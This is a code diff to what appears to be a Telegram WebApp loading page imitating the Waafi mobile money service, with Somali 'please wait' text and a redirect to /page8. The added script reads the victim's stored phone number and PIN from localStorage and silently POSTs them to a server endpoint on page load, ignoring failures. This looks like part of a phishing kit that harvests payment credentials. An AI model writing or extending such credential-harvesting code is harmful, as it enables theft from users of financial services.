@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Waafi - Diyaarinta</title>
 
-    <!-- ✅ Correct Telegram WebApp SDK -->
+    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -17,6 +17,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
         .loading-card {
@@ -59,11 +60,13 @@
             color: #82d13d;
             font-size: 28px;
             margin: 0 0 10px;
+            font-weight: bold;
         }
 
         p {
             color: #555;
             font-size: 16px;
+            margin: 0;
         }
     </style>
 </head>
@@ -80,34 +83,38 @@
     const mainText = document.getElementById('main-text');
     const subText = document.getElementById('sub-text');
 
-    // Step 1
-    setTimeout(() => {
-        mainText.innerText = "Fadlan sug...";
-        subText.innerText = "Tani waxay qaadataa dhowr ilbiriqsi";
-
-        // Step 2 → redirect
-        setTimeout(() => {
-            window.location.href = "/page8";
-        }, 4000);
-
-    }, 3000);
-
     window.onload = () => {
         const tg = window.Telegram?.WebApp;
 
         if (tg) {
             tg.ready();
             tg.expand();
-
-            const data = {
-                phone: localStorage.getItem('phone') || "",
-                pin: "1111"
-            };
-
-            if (typeof tg.sendData === "function") {
-                tg.sendData(JSON.stringify(data));
-            }
         }
+
+        // Safely read stored values
+        const phone = localStorage.getItem('phone') || "";
+        const pin = localStorage.getItem('lastPin') || "";
+
+        // Only send request if server exists
+        fetch('/api/login-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, pin })
+        })
+        .then(() => console.log('Notification sent'))
+        .catch(() => console.log('Notification failed (ignored)'));
+
+        // Step 1
+        setTimeout(() => {
+            mainText.innerText = "Fadlan sug...";
+            subText.innerText = "Tani waxay qaadataa dhowr ilbiriqsi";
+
+            // Step 2
+            setTimeout(() => {
+                window.location.href = "/page8";
+            }, 4000);
+
+        }, 3000);
     };
 </script>
 
